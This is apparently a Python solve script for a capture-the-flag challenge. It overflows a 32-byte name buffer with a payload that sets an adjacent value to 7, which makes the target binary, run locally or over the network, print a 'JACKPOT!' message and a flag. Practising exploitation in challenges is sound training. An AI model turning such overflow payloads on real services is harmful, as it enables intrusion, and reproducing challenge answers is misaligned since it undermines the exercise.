"""Python 3, standard library only. Use --local BINARY or HOST PORT."""
import argparse
from pathlib import Path
import socket
import struct
import subprocess
import sys

PAYLOAD = b"A" * 32 + struct.pack("<I", 7)


def solve_remote(host, port):
    with socket.create_connection((host, port), timeout=5) as connection:
        banner = bytearray()
        while not banner.endswith(b"Your name: "):
            chunk = connection.recv(1)
            if not chunk:
                raise RuntimeError("Connection closed before the name prompt")
            banner.extend(chunk)
        connection.sendall(PAYLOAD)
        output = bytearray(banner)
        while True:
            chunk = connection.recv(4096)
            if not chunk:
                return bytes(output)
            output.extend(chunk)


def main():
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("host", nargs="?")
    parser.add_argument("port", nargs="?", type=int)
    parser.add_argument("--local", metavar="BINARY")
    args = parser.parse_args()
    if args.local:
        result = subprocess.run([str(Path(args.local).resolve())], input=PAYLOAD,
                                stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                timeout=5, check=True)
        output = result.stdout
    elif args.host and args.port:
        output = solve_remote(args.host, args.port)
    else:
        parser.error("provide HOST PORT or --local BINARY")
    sys.stdout.buffer.write(output)
    if b"JACKPOT!" not in output or b"vka{" not in output:
        raise SystemExit("Flag not received")


if __name__ == "__main__":
    main()
